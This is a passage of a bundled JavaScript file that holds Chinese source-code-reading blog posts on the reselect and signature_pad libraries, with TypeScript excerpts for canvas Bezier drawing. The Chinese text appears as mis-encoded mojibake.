construct...</span></code></pre>","slug":"yuan-ma-yue-du-redux-yuan-ma-yi-ge-xiao-ji-qiao","sha":"f2bdc7f7ed9f3d78acc23221e83c625f7b8568f8"}')},680:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"reselect-yuan-ma-liang-dian-jie-shao\\">reselectæºç äº®ç‚¹ä»‹ç»</h2>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.reselect/README.md\\">å®Œæ•´æºç è¯´æ˜æ³¨é‡Š</a></p>\\n<p>å¯¼å›¾ï¼š</p>\\n<p><img src=\\"/article/img/reselect.png\\" alt=\\"\\"></p>\\n<h3 id=\\"defaultmemoize\\">defaultMemoize</h3>\\n<p>ä¸€ä¸ªç¼“å­˜å‡½æ•°ï¼Œå…¶å†…éƒ¨ï¼š</p>\\n<ol>\\n<li>é€šè¿‡é—­åŒ…ä¿å­˜å‚æ•°å’Œç»“æœ</li>\\n<li>æ¯æ¬¡è°ƒç”¨å¯¹å‚æ•°è¿›è¡Œæµ…æ¯”è¾ƒ</li>\\n<li>å‚æ•°æ¯”è¾ƒç»“æœç›¸åŒï¼Œè¿”å›ç¼“å­˜çš„ç»“æœ</li>\\n</ol>\\n<hr>\\n<h3 id=\\"createselectorcreator-createselector\\">createSelectorCreator, createSelector</h3>\\n<p>reselectæœ€ä¸»è¦å‡½æ•°</p>\\n<ol>\\n<li><p><code>createSelectorCreator</code>è¿”å›ä¸€ä¸ªå‡½æ•°ï¼Œç§°ä¸º<code>createSelector</code></p>\\n</li>\\n<li><p><code>createSelector</code>æ¥å—2ç±»å‚æ•°</p>\\n<p> <code>ä¾èµ–æ•°æ®å‡½æ•°</code>(å¯ä»¥æœ‰å¤šä¸ª)</p>\\n<p> <code>æ•°æ®å¤„ç†å‡½æ•°</code>(å¿…é¡»æ”¾åœ¨å‚æ•°çš„æœ€å)ï¼š</p>\\n</li>\\n<li><p><code>createSelector</code>çš„å†…éƒ¨æ“ä½œ</p>\\n<ol>\\n<li><p>å¯¹<code>ä¾èµ–æ•°æ®å‡½æ•°</code>å’Œ<code>æ•°æ®å¤„ç†å‡½æ•°</code>æ‰§è¡Œç¼“å­˜å‡½æ•°</p>\\n</li>\\n<li><p>æ¯æ¬¡æ‰§è¡Œ<code>createSelector</code>çš„æ—¶å€™ï¼Œä¾æ¬¡æ¯”è¾ƒ<code>ä¾èµ–æ•°æ®å‡½æ•°</code>å’Œ<code>æ•°æ®å¤„ç†å‡½æ•°</code>çš„ç¼“å­˜</p>\\n<p>è¿™æ ·å¤„ç†å°±å¯ä»¥çŸ¥é“è¦æƒ³è¿”å›ç¼“å­˜çš„ç»“æœï¼Œå¿…é¡»è¦è¾¾åˆ°ä»¥ä¸‹æ¡ä»¶ä»»ä¸€ï¼š</p>\\n<ol>\\n<li><code>ä¾èµ–æ•°æ®å‡½æ•°</code>çš„å‚æ•°(ä¸€èˆ¬ä¸º<code>store</code>)å…¨ç­‰æ¯”è¾ƒä¸ºtrue</li>\\n<li><code>ä¾èµ–æ•°æ®å‡½æ•°</code>çš„å‚æ•°(ä¸€èˆ¬ä¸º<code>store</code>)å…¨ç­‰æ¯”è¾ƒä¸ºfalse, <code>æ•°æ®å¤„ç†å‡½æ•°</code>çš„å‚æ•°å…¨ç­‰æ¯”è¾ƒä¸ºtrue</li>\\n</ol>\\n</li>\\n</ol>\\n</li>\\n<li><p>è¿”å›<code>ä¾èµ–æ•°æ®å‡½æ•°</code></p>\\n<p> <a href=\\"https://codesandbox.io/s/jlpozpjprw\\">reselectä½¿ç”¨ä¾‹å­</a></p>\\n</li>\\n</ol>\\n<hr>\\n<h3 id=\\"createstructuredselector\\">createStructuredSelector</h3>\\n<p>ä¸€ä¸ªä¾¿åˆ©çš„å‡½æ•°ï¼Œå¯ä»¥ç”¨äºå˜æ›´æ•°æ®çš„keyå€¼ï¼Œé€šè¿‡åµŒå¥—å¯ä»¥å˜æ›´æ•°æ®çš„ç»“æ„</p>\\n<p>å®ƒçš„å†…éƒ¨æ­£æ˜¯è°ƒç”¨äº†<code>createSelector</code></p>\\n<ol>\\n<li><p>æ¥å—2ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«ä¸ºä¸€ä¸ª(å‚æ•°1)å¯¹è±¡ï¼Œä¸€ä¸ª(å‚æ•°2)<code>selectorCreator</code>(é»˜è®¤å°±æ˜¯createSelector)</p>\\n</li>\\n<li><p>è°ƒç”¨<code>createSelector</code>ï¼Œå°†å‚æ•°1(å¯¹è±¡)çš„valueå€¼ä½œä¸º<code>ä¾èµ–æ•°æ®å‡½æ•°</code>ï¼Œ\\nå…¶<code>æ•°æ®å¤„ç†å‡½æ•°</code>å°±æ˜¯ä¸€ä¸ªå°†å‚æ•°1(å¯¹è±¡)çš„keyå€¼å’Œ<code>ä¾èµ–æ•°æ®å‡½æ•°</code>çš„è¿”å›å€¼ç»„æˆä¸€ä¸ªæ–°çš„å¯¹è±¡çš„è¿‡ç¨‹ã€‚</p>\\n<p> <a href=\\"https://codesandbox.io/s/53kvl30564\\">createStructuredSelectorä½¿ç”¨ä¾‹å­</a></p>\\n</li>\\n</ol>\\n<hr>\\n<p>æ³¨æ„ç‚¹ï¼š</p>\\n<ol>\\n<li><p>ç¼“å­˜å‡½æ•°åªèƒ½ä¿å­˜ä¸Šä¸€æ¬¡ç¼“å­˜çš„å€¼(å•ä¸ª)ã€‚</p>\\n</li>\\n<li><p>ç¼“å­˜å‡½æ•°æ˜¯é€šè¿‡å¯¹æ¯”å‚æ•°è€Œè¿›è¡Œåˆ¤æ–­çš„ï¼Œå› æ­¤å¿…é¡»ä¿è¯æ‰€æä¾›çš„<code>ä¾èµ–æ•°æ®å‡½æ•°</code>å’Œ<code>æ•°æ®å¤„ç†å‡½æ•°</code>éƒ½æ˜¯çº¯å‡½æ•°ï¼Œè€Œä¸”å®ƒåªä¿å­˜ä¸Šä¸€æ¬¡å‡½æ•°ã€‚</p>\\n<p> <a href=\\"https://codesandbox.io/s/n6y126v2p\\">éçº¯å‡½æ•°ä¾‹å­</a></p>\\n</li>\\n<li><p>è¦æƒ³å–æ¶ˆç¼“å­˜ï¼Œå¿…é¡»å–æ¶ˆå¼•ç”¨ï¼ŒåŒ…æ‹¬<code>ä¾èµ–æ•°æ®å‡½æ•°</code>å‚æ•°(store)çš„å¼•ç”¨å’Œå†…éƒ¨<code>æ•°æ®å¤„ç†å‡½æ•°</code>çš„å‚æ•°å¼•ç”¨</p>\\n<p> <a href=\\"https://codesandbox.io/s/lx1kq3lj39\\">å–æ¶ˆç¼“å­˜ä¾‹å­</a></p>\\n</li>\\n</ol>\\n","toc":[{"anchor":"reselect-yuan-ma-liang-dian-jie-shao","level":2,"text":"reselectæºç äº®ç‚¹ä»‹ç»"},{"anchor":"defaultmemoize","level":3,"text":"defaultMemoize"},{"anchor":"createselectorcreator-createselector","level":3,"text":"createSelectorCreator, createSelector"},{"anchor":"createstructuredselector","level":3,"text":"createStructuredSelector"}],"relatedTags":null,"created_at":"2018-07-13","timeArr":[2018,6,13,0,0,0,0],"title":"æºç é˜…è¯»-reselectæºç å­¦ä¹ ","uuid":"2cf2373f2fa9c28ce15661630048ac1848d2530f","summary":"<h4>reselectæºç äº®ç‚¹ä»‹ç»</h4>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.reselect/README.md\\">å®Œæ•´æºç è¯´æ˜æ³¨é‡Š</a></p>\\n<p>å¯¼å›¾ï¼š</p>\\n<p><img src=\\"/article/img/reselect.png\\" alt=\\"\\">\\n...</p>","slug":"yuan-ma-yue-du-reselect-yuan-ma-xue-xi","sha":"85d8aee7f13669499db1bd4d7c3233117665daea"}')},681:function(n){n.exports=JSON.parse('{"content":"<blockquote>\\n<p><a href=\\"https://github.com/szimek/signature_pad\\">signature_pad</a>ä¸€ä¸ªåŸºäºCanvasçš„å¹³æ»‘æ‰‹å†™ç”»æ¿å·¥å…·</p>\\n</blockquote>\\n<hr>\\n<h4 id=\\"yi-xie-jie-shao\\">ä¸€äº›ä»‹ç»</h4>\\n<p>å®ç°æ‰‹å†™æœ‰å¤šç§æ–¹å¼ã€‚</p>\\n<p>ä¸€ç§æ¯”è¾ƒå®¹æ˜“åšå‡ºçš„æ˜¯å¯¹é¼ æ ‡ç§»åŠ¨è½¨è¿¹ç”»ç‚¹ï¼Œå†å°†ä¸¤ç‚¹ä¹‹é—´ä»¥<code>ç›´çº¿</code>ç›¸è¿ï¼Œæœ€åå†è¿›è¡Œå¹³æ»‘å¤„ç†ï¼Œè¿™ç§æ–¹æ¡ˆä¸éœ€è¦ä»€ä¹ˆç®—æ³•æ”¯æŒï¼Œä½†åŒæ ·ï¼Œå®ƒé¢å¯¹ä¸€ä¸ªæ€§èƒ½å’Œç¾è§‚çš„æŠ‰æ‹©ï¼Œæ‰“çš„ç‚¹å¤šï¼Œå¯†é›†ï¼Œæ€§èƒ½ç›¸å¯¹è¾ƒä½ï¼Œä½†æ›´åŠ ç¾è§‚ï¼Œè§†è§‰ä¸Šæ›´å¹³æ»‘ï¼›</p>\\n<p>æ­¤å¤„ç”¨çš„å¦ä¸€ç§æ–¹æ¡ˆï¼Œç”»è´å¡å°”æ›²çº¿ã€‚</p>\\n<p>ç”±äº<code>canvas</code>æ²¡æœ‰é»˜è®¤çš„ç”»å‡ºè´å¡å°”æ›²çº¿æ–¹æ³•ï¼Œå› æ­¤æ›²çº¿æ˜¯é€šè¿‡ä¸æ–­ç”»å‡º<code>ä¸€ä¸ªä¸ªç‚¹</code>å½¢æˆçš„ï¼Œé‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œè¿™äº›ç‚¹è°æ¥å®šï¼Ÿ</p>\\n<p>è¿™é‡Œä½¿ç”¨äº†è´å¡å°”æ›²çº¿çš„ä¸€ç³»åˆ—ç®—æ³•ï¼ŒåŒ…æ‹¬<code>æ±‚æ§åˆ¶ç‚¹</code>ï¼Œ<code>æ±‚é•¿åº¦</code>ï¼Œ<code>è®¡ç®—å½“å‰ç‚¹çš„å¤§å°</code>ï¼Œæœ€åç”¨<code>canvas</code>ç”»å‡ºæ¯ä¸€ä¸ªç¡®å®šä½ç½®çš„ç‚¹ã€‚</p>\\n<h4 id=\\"can-shu-ji-pei-zhi-jie-shao\\">å‚æ•°åŠé…ç½®ä»‹ç»</h4>\\n<p>æä¾›çš„å¯é…ç½®å‚æ•°å¦‚ä¸‹</p>\\n<pre><code><pre class=\\"hljs\\"><code>export interface IOptions {\\n  // ç‚¹çš„å¤§å°(ä¸æ˜¯çº¿æ¡)\\n  dotSize?: number | (() =&gt; number);\\n  // æœ€ç²—çš„çº¿æ¡å®½åº¦\\n  minWidth?: number;\\n  // æœ€ç»†çš„çº¿æ¡å®½åº¦\\n  maxWidth?: number;\\n  // æœ€å°é—´éš”è·ç¦»(è¿™ä¸ªè·ç¦»ç”¨è´å¡å°”æ›²çº¿å¡«å……)\\n  minDistance?: number;\\n  // èƒŒæ™¯è‰²\\n  backgroundColor?: string;\\n  // ç¬”é¢œè‰²\\n  penColor?: string;\\n  // èŠ‚æµçš„é—´éš”\\n  throttle?: number;\\n  // å½“å‰ç”»ç¬”é€Ÿåº¦çš„è®¡ç®—ç‡ï¼Œé»˜è®¤0.7ï¼Œæ„æ€å°±æ˜¯ å½“å‰é€Ÿåº¦=å½“å‰å®é™…é€Ÿåº¦*0.7+ä¸Šä¸€æ¬¡é€Ÿåº¦*0.3\\n  velocityFilterWeight?: number;\\n  // åˆå§‹å›è°ƒ\\n  onBegin?: (event: MouseEvent | Touch) =&gt; void;\\n  // ç»“æŸå›è°ƒ\\n  onEnd?: (event: MouseEvent | Touch) =&gt; void;\\n}</code></pre></code></pre><p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯å¹¶æ²¡æœ‰<code>çº¿æ¡ç²—ç»†</code>è¿™ä¸ªé€‰é¡¹ï¼Œå› ä¸ºè¿™é‡Œé¢çš„ç²—ç»†ä¸ç­‰çº¿æ¡éƒ½æ˜¯é€šè¿‡ä¸€ä¸ªä¸ªå¤§å°ä¸åŒçš„ç‚¹æ„é€ è€Œæˆï¼›</p>\\n<p><code>throttle</code>è¿™ä¸ªé…ç½®å¯ä»¥å‚è€ƒ<code>loadsh</code>æˆ–è€…<code>underscore</code>çš„<code>_.throttle</code>ï¼ŒåŠŸèƒ½ä¸€è‡´ï¼Œå°±æ˜¯ä¸ºäº†æé«˜æ€§èƒ½ã€‚</p>\\n<h4 id=\\"zhu-ce-shi-jian\\">æ³¨å†Œäº‹ä»¶</h4>\\n<p>åœ¨<code>constructor</code>å†…éƒ¨ï¼Œé™¤äº†é…ç½®ä¼ å…¥çš„å‚æ•°å¤–ï¼Œå°±æ˜¯æ³¨å†Œäº‹ä»¶ã€‚</p>\\n<p>è¿™é‡Œä¼˜å…ˆä½¿ç”¨äº†<a href=\\"https://developer.mozilla.org/zh-CN/docs/Web/API/PointerEvent\\">PointerEvent</a>è§¦ç‚¹äº‹ä»¶ï¼Œ<code>PointerEvent</code>å¯ä»¥è¯´æ˜¯è§¦æ‘¸ä»¥åŠç‚¹å‡»äº‹ä»¶çš„ä¸€ä¸ªç»Ÿä¸€ï¼Œå¦‚æœè®¾å¤‡æ”¯æŒï¼Œä¸éœ€è¦å†åˆ†åˆ«ä¸º<code>mouse</code>å’Œ<code>touch</code>å†™ä¸¤å¥—äº‹ä»¶äº†ã€‚</p>\\n<h4 id=\\"zhuang-tai-shu-ju-chu-cun\\">çŠ¶æ€æ•°æ®å‚¨å­˜</h4>\\n<p>çŠ¶æ€å¼€å…³ï¼š</p>\\n<ul>\\n<li><p><code>this._mouseButtonDown</code></p>\\n<p>  å½“æ‰§è¡Œ<code>move</code>äº‹ä»¶æ—¶ï¼Œä¼šæ£€æŸ¥æ­¤çŠ¶æ€ï¼Œåªæœ‰åœ¨<code>true</code>çš„æƒ…å†µä¸‹æ‰ä¼šæ‰§è¡Œã€‚</p>\\n</li>\\n</ul>\\n<p>æ•°æ®å‚¨å­˜åˆ†ä¸º2ç§æ ¼å¼ï¼š</p>\\n<ol>\\n<li><p><code>pointGroup</code></p>\\n<p> è¿™æ˜¯å½“å‰ç¬”ç”»çš„ç‚¹çš„ä¸€ä¸ªé›†åˆï¼Œå†…éƒ¨å‚¨å­˜äº†å½“å‰ç¬”ç”»çš„é¢œè‰²<code>color</code>å’Œæ‰€æœ‰çš„ç‚¹<code>points&lt;Array&gt;</code>ã€‚</p>\\n</li>\\n<li><p><code>this._data</code></p>\\n<p> è¿™æ˜¯ä¸€ä¸ªå‚¨å­˜æ‰€æœ‰ç¬”ç”»çš„æ ˆï¼Œæ ¼å¼ä¸º<code>[pointGroup, pointGroup, ..., pointGroup]</code>ï¼Œå½“éœ€è¦æ‰§è¡Œ<code>undo</code>çš„æ—¶å€™ï¼Œåªéœ€è¦åˆ é™¤<code>this._data</code>ä¸­çš„æœ€åä¸€æ¡æ•°æ®ã€‚</p>\\n</li>\\n</ol>\\n<h4 id=\\"shi-jian-liu-cheng-ji-fang-fa\\">äº‹ä»¶æµç¨‹åŠæ–¹æ³•</h4>\\n<h5 id=\\"mousedown-shi-jian\\"><code>mouseDown</code>äº‹ä»¶</h5>\\n<p>å½“é¼ æ ‡(è§¦ç‚¹)æŒ‰ä¸‹æ—¶ï¼Œæ”¹å˜çŠ¶æ€<code>this._mouseButtonDown = true</code>ï¼Œè°ƒç”¨<code>onBegin</code>å›è°ƒï¼Œåˆ›å»ºå½“å‰ç¬”ç”»çš„ä¸€ä¸ªæ–°çš„é›†åˆï¼Œç„¶åå¯¹<strong>å½“å‰ç‚¹æ‰§è¡Œæ›´æ–°</strong>ã€‚</p>\\n<h5 id=\\"mousemove-shi-jian\\"><code>mouseMove</code>äº‹ä»¶</h5>\\n<p>é¦–å…ˆæ£€æŸ¥<code>this._mouseButtonDown</code>çŠ¶æ€ï¼Œå¯¹<strong>å½“å‰ç‚¹æ‰§è¡Œæ›´æ–°</strong>ã€‚</p>\\n<h5 id=\\"mouseup-shi-jian\\"><code>mouseUp</code>äº‹ä»¶</h5>\\n<p>æ”¹å˜çŠ¶æ€<code>this._mouseButtonDown = false;</code>ï¼Œè°ƒç”¨<code>onEnd</code>å›è°ƒï¼Œå¯¹<strong>å½“å‰ç‚¹æ‰§è¡Œæ›´æ–°</strong>ã€‚</p>\\n<p>å¯ä»¥çœ‹åˆ°ï¼Œä¸Šé¢çš„æ¯ä¸€ä¸ªäº‹ä»¶å†…éƒ¨éƒ½è°ƒç”¨å¯¹å½“å‰ç‚¹æ‰§è¡Œæ›´æ–°çš„æ–¹æ³•ã€‚</p>\\n<h5 id=\\"dian-de-geng-xin-fang-fa-_strokeupdate\\">ç‚¹çš„æ›´æ–°æ–¹æ³•<code>_strokeUpdate</code></h5>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>private _strokeUpdate(event: MouseEvent | Touch): <span class=\\"hljs-keyword\\">void</span> {\\n    <span class=\\"hljs-comment\\">// è·å–å½“å‰è§¦ç‚¹çš„ä½ç½®</span>\\n    <span class=\\"hljs-keyword\\">const</span> x = event.clientX;\\n    <span class=\\"hljs-keyword\\">const</span> y = event.clientY;\\n\\n    <span class=\\"hljs-comment\\">// åˆ›å»ºç‚¹</span>\\n    <span class=\\"hljs-keyword\\">const</span> point = <span class=\\"hljs-keyword\\">this</span>._createPoint(x, y);\\n    <span class=\\"hljs-comment\\">// è°ƒå‡ºæœ€åä¸€ä¸ªç‚¹é›†</span>\\n    <span class=\\"hljs-keyword\\">const</span> lastPointGroup = <span class=\\"hljs-keyword\\">this</span>._data[<span class=\\"hljs-keyword\\">this</span>._data.length - <span class=\\"hljs-number\\">1</span>];\\n    <span class=\\"hljs-comment\\">// è·å–æœ€åä¸€ä¸ªç‚¹é›†çš„ç‚¹çš„æ•°ç»„</span>\\n    <span class=\\"hljs-keyword\\">const</span> lastPoints = lastPointGroup.points;\\n    <span class=\\"hljs-comment\\">// å¦‚æœå­˜åœ¨ä¸Šä¸€ä¸ªç‚¹ï¼Œè·å–ä¸Šä¸€ä¸ªç‚¹</span>\\n    <span class=\\"hljs-keyword\\">const</span> lastPoint =\\n      lastPoints.length &gt; <span class=\\"hljs-number\\">0</span> &amp;&amp; lastPoints[lastPoints.length - <span class=\\"hljs-number\\">1</span>];\\n    <span class=\\"hljs-comment\\">// åˆ¤æ–­ä¸Šä¸€ä¸ªç‚¹åˆ°å½“å‰ç‚¹æ˜¯å¦å¤ªè¿‘(ä¹Ÿå°±æ˜¯å°äºé…ç½®çš„æœ€å°é—´éš”è·ç¦»)</span>\\n    <span class=\\"hljs-keyword\\">const</span> isLastPointTooClose = lastPoint\\n      ? point.distanceTo(lastPoint) &lt;= <span class=\\"hljs-keyword\\">this</span>.minDistance\\n      : <span class=\\"hljs-literal\\">false</span>;\\n    <span class=\\"hljs-comment\\">// è°ƒå‡ºç‚¹é›†çš„é¢œè‰²</span>\\n    <span class=\\"hljs-keyword\\">const</span> color = lastPointGroup.color;\\n\\n    <span class=\\"hljs-comment\\">// Skip this point if it\'s too close to the previous one</span>\\n    <span class=\\"hljs-comment\\">// å­˜åœ¨ä¸Šä¸€ä¸ªç‚¹ä½†æ˜¯å¤ªè¿‘ï¼Œè·³è¿‡ï¼Œå…¶ä½™çš„æ‰§è¡Œ</span>\\n    <span class=\\"hljs-keyword\\">if</span> (!lastPoint || !(lastPoint &amp;&amp; isLastPointTooClose)) {\\n      <span class=\\"hljs-comment\\">// å‘ä¸Šä¸€æ¬¡çš„ç‚¹æ•°ç»„ä¸­æ·»åŠ å½“å‰ç‚¹ï¼Œå¹¶ä¸”ç”Ÿæˆä¸€ä¸ªæ–°çš„è´å¡å°”æ›²çº¿å®ä¾‹</span>\\n      <span class=\\"hljs-comment\\">// åŒ…æ‹¬4ä¸ªç‚¹ ï¼ˆåˆå§‹ç‚¹ï¼Œ2ä¸ªæ§åˆ¶ç‚¹ï¼Œç»“æŸç‚¹ï¼‰</span>\\n      <span class=\\"hljs-comment\\">// åˆå§‹å®½åº¦ï¼Œæœ€ç»ˆå®½åº¦</span>\\n      <span class=\\"hljs-keyword\\">const</span> curve = <span class=\\"hljs-keyword\\">this</span>._addPoint(point);\\n\\n      <span class=\\"hljs-comment\\">// å¦‚æœä¸å­˜åœ¨lastPointï¼Œå³å½“å‰ç‚¹æ˜¯ç¬¬ä¸€ä¸ªç‚¹</span>\\n      <span class=\\"hljs-keyword\\">if</span> (!lastPoint) {\\n        <span class=\\"hljs-comment\\">// ç”»ä¸€ä¸ªç‚¹</span>\\n        <span class=\\"hljs-keyword\\">this</span>._drawDot({ color, point });\\n      <span class=\\"hljs-comment\\">// å¦‚æœå­˜åœ¨lastPoint å¹¶ä¸”èƒ½å½¢æˆä¸€ä¸ªè´å¡å°”æ›²çº¿å®ä¾‹(3ä¸ªç‚¹ä»¥ä¸Š)</span>\\n      } <span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span> (curve) {\\n        <span class=\\"hljs-comment\\">// ç”»å‡ºå‚æ•°ä¸­curveå®ä¾‹ä¸­ä¸¤ç‚¹ä¹‹é—´çš„æ›²çº¿</span>\\n        <span class=\\"hljs-keyword\\">this</span>._drawCurve({ color, curve });\\n      }\\n      <span class=\\"hljs-comment\\">// æ·»åŠ åˆ°å½“å‰ç¬”ç”»çš„ç‚¹æ•°ç»„</span>\\n      lastPoints.push({\\n        <span class=\\"hljs-attr\\">time</span>: point.time,\\n        <span class=\\"hljs-attr\\">x</span>: point.x,\\n        <span class=\\"hljs-attr\\">y</span>: point.y,\\n      });\\n    }\\n  }</code></pre></code></pre>\\n<p>è¿™ä¸ªæ–¹æ³•å‰é¢å°±æ˜¯ä¸€ç³»åˆ—åˆ¤æ–­</p>\\n<ul>\\n<li><p>åˆ¤æ–­æ˜¯å¦æ˜¯ç¬¬ä¸€ä¸ªç‚¹</p>\\n</li>\\n<li><p>åˆ¤æ–­æ˜¯å¦èƒ½åŠ å…¥ç‚¹çš„é›†åˆ(æ»¡è¶³ç‚¹çš„æœ€å°é—´éš”)</p>\\n</li>\\n<li><p>åˆ¤æ–­æ˜¯å¦èƒ½ç”»å‡ºè´å¡å°”æ›²çº¿(æ»¡è¶³è‡³å°‘3ä¸ªç‚¹)</p>\\n<p>  å¯¹äºèƒ½ç”»å‡ºè´å¡å°”æ›²çº¿çš„ç‚¹ï¼Œæ‰§è¡Œç®—æ³•ï¼Œæ±‚å‡º<code>Besier</code>å®ä¾‹ï¼ŒåŒ…æ‹¬4ä¸ªç‚¹<code>åˆå§‹ç‚¹</code>ï¼Œ<code>ç»“æŸç‚¹</code>ï¼Œ<code>æ§åˆ¶ç‚¹1</code>ï¼Œ<code>æ§åˆ¶ç‚¹2</code>ä»¥åŠå½“å‰æ›²çº¿ä¸­çº¿æ¡çš„çš„<code>åˆå§‹å®½åº¦</code>å’Œ<code>ç»“æŸå®½åº¦</code>ã€‚</p>\\n<p>  å…·ä½“å¦‚ä½•ç®—çš„ï¼Œè¯·å‚è€ƒæºç <code>src/bezier.ts</code>å’Œ<a href=\\"https://medium.com/square-corner-blog/smoother-signatures-be64515adb33\\">è¿™ç¯‡æ–‡ç« </a>ã€‚</p>\\n</li>\\n</ul>\\n<p>å¯¹äºèƒ½ç”»å‡ºè´å¡å°”æ›²çº¿çš„ï¼Œå¯¹å·²ç»æ±‚å‡ºçš„<code>Bezier</code>å®ä¾‹ï¼Œæ‰§è¡Œ<code>this._drawCurve</code>ï¼Œå¦åˆ™æ‰§è¡Œ<code>this._drawDot</code></p>\\n<h5 id=\\"hua-dian-de-fang-fa-this_drawdot\\">ç”»ç‚¹çš„æ–¹æ³•<code>this._drawDot</code></h5>\\n<p>è·å–é…ç½®ä¸­çš„<code>dotSize</code>ï¼Œæ‰§è¡Œ<code>canvas</code>ç”»ç‚¹ã€‚</p>\\n<h5 id=\\"hua-xian-de-fang-fa-this__drawcurve\\">ç”»çº¿çš„æ–¹æ³•<code>this.__drawCurve</code></h5>\\n<ol>\\n<li><p>æ±‚å‡ºå½“å‰<code>Bezier</code>å®ä¾‹<code>åˆå§‹ç‚¹</code>å’Œ<code>ç»“æŸç‚¹</code>ä¹‹é—´çš„è·ç¦»ï¼Œè¿™ä¸ªè·ç¦»ä¸æ˜¯ç›´çº¿è·ç¦»ï¼Œè€Œæ˜¯è´å¡å°”æ›²çº¿è·ç¦»ã€‚</p>\\n</li>\\n<li><p>å¯¹è¿™ä¸ªè·ç¦»è¿›è¡Œæ‰©å±•ï¼Œä¾‹å¦‚ï¼Œè®¡ç®—å¾—åˆ°è·ç¦»ä¸º<code>50</code>ï¼Œé‚£å°±æ‰©å±•ä¸º<code>100</code>ä¸ªç‚¹ï¼Œå³æˆ‘éœ€è¦åœ¨<code>50</code>è¿™ä¸ªè·ç¦»å†…ç”»å‡º<code>100</code>ä¸ªç‚¹ï¼›</p>\\n<p> è¿™ä¹ˆåšå¯ä»¥ä¿è¯åœ¨æ­£å¸¸æˆ–è€…ç¨å¾®å¿«é€Ÿçš„ä¹¦å†™ä¸­ï¼Œä¸å‡ºç°æ–­å±‚ã€‚</p>\\n</li>\\n<li><p>æ¥ç€åˆæ˜¯<a href=\\"https://medium.com/square-corner-blog/smoother-signatures-be64515adb33\\">ç®—æ³•</a>ï¼Œç›®çš„æ˜¯æ±‚å‡ºè¿™ä¸ªè·ç¦»å†…çš„æ¯ä¸€ä¸ªç‚¹çš„å¤§å°ï¼Œè¿™æ˜¯ä¸€ä¸ªå˜åŒ–å€¼ï¼Œæ˜¯çš„ç²—ç»†å˜åŒ–æ›´åŠ å¹³æ»‘ã€‚</p>\\n</li>\\n<li><p>æœ€ååŒæ ·æ˜¯<code>canvas</code>ç”»ç‚¹ã€‚</p>\\n</li>\\n</ol>\\n<p>ä»¥ä¸Šå°±æ˜¯æ•´ä¸ªåŸºæœ¬æµç¨‹ã€‚</p>\\n<h4 id=\\"zong-jie\\">æ€»ç»“</h4>\\n<p>é˜…è¯»ä¸€éåï¼Œè¿™ä¸ªåº“è¯´ç™½å°±æ˜¯åŸºç¡€çš„äº‹ä»¶æ“ä½œ+è´å¡å°”æ›²çº¿ç®—æ³•ï¼Œä½†æ˜¯ï¼Œå®ƒå†…éƒ¨çš„ä»£ç æ ¼å¼éå¸¸æ¸…æ™°ï¼Œ<code>ç»†ç²’åº¦+ä»£ç å¤ç”¨</code>ä½¿å¾—ç»´æŠ¤èµ·æ¥éå¸¸æ–¹ä¾¿ã€‚</p>\\n<p>åŒæ—¶å¯ä»¥å¯¹è´å¡å°”æ›²çº¿æœ‰ä¸€ä¸ªæ›´æ·±å±‚çš„äº†è§£(ç®—æ³•è¿˜æ˜¯æ²¡æ³•æ‰‹æ’•å›§)ï¼Œä½†èµ·ç æœ‰ä¸€ä¸ªæ¯”è¾ƒå®Œæ•´çš„æ€è·¯ï¼›</p>\\n<p>ä¸€äº›å¯ä»¥å€Ÿé‰´çš„ä¸œè¥¿ï¼š</p>\\n<ul>\\n<li><a href=\\"#%E6%B3%A8%E5%86%8C%E4%BA%8B%E4%BB%B6\\">PointerEventçš„ä¼˜åŠ¿</a></li>\\n<li>canvas+è´å¡å°”æ›²çº¿</li>\\n<li>èŠ‚æµ<code>throttle</code>çš„å†™æ³•(å‚è€ƒæºç src/throttle.ts)</li>\\n<li><a href=\\"#%E7%8A%B6%E6%80%81%E6%95%B0%E6%8D%AE%E5%82%A8%E5%AD%98\\">æ•°æ®ç»“æ„åŠå®ç°<code>undo</code>çš„æ–¹æ¡ˆ</a></li>\\n</ul>\\n<blockquote>\\n<p>è´å¡å°”æ›²çº¿ç®—æ³•èµ„æ–™ï¼š</p>\\n<ul>\\n<li><a href=\\"https://medium.com/square-corner-blog/smoother-signatures-be64515adb33\\">https://medium.com/square-corner-blog/smoother-signatures-be64515adb33</a></li>\\n<li><a href=\\"https://www.lemoda.net/maths/bezier-length/index.html\\">https://www.lemoda.net/maths/bezier-length/index.html</a></li>\\n</ul>\\n</blockquote>\\n<hr>\\n<blockquote>\\n<p><a href=\\"https://segmentfault.com/blog/souce-code\\"><strong>æºç é˜…è¯»ä¸“æ </strong></a>å¯¹ä¸€äº›ä¸­å°å‹çƒ­é—¨é¡¹ç›®è¿›è¡Œæºç é˜…è¯»å’Œåˆ†æï¼Œå¯¹å…¶æ•´ä½“åšå‡ºå¯¼å›¾ï¼Œä»¥ä¾¿å¿«é€Ÿäº†è§£å†…éƒ¨å…³ç³»åŠæ‰§è¡Œé¡ºåºã€‚\\nå½“å‰æºç (å¸¦æ³¨é‡Š)ï¼Œä»¥åŠæ›´å¤šæºç é˜…è¯»å†…å®¹ï¼š<a href=\\"https://github.com/stonehank/sourcecode-analysis\\">https://github.com/stonehank/sourcecode-analysis</a>ï¼Œæ¬¢è¿<code>fork</code>ï¼Œæ±‚:star:</p>\\n</blockquote>\\n","toc":[{"anchor":"yi-xie-jie-shao","level":4,"text":"ä¸€äº›ä»‹ç»"},{"anchor":"can-shu-ji-pei-zhi-jie-shao","level":4,"text":"å‚æ•°åŠé…ç½®ä»‹ç»"},{"anchor":"zhu-ce-shi-jian","level":4,"text":"æ³¨å†Œäº‹ä»¶"},{"anchor":"zhuang-tai-shu-ju-chu-cun","level":4,"text":"çŠ¶æ€æ•°æ®å‚¨å­˜"},{"anchor":"shi-jian-liu-cheng-ji-fang-fa","level":4,"text":"äº‹ä»¶æµç¨‹åŠæ–¹æ³•"},{"anchor":"mousedown-shi-jian","level":5,"text":"<code>mouseDown</code>äº‹ä»¶"},{"anchor":"mousemove-shi-jian","level":5,"text":"<code>mouseMove</code>äº‹ä»¶"},{"anchor":"mouseup-shi-jian","level":5,"text":"<code>mouseUp</code>äº‹ä»¶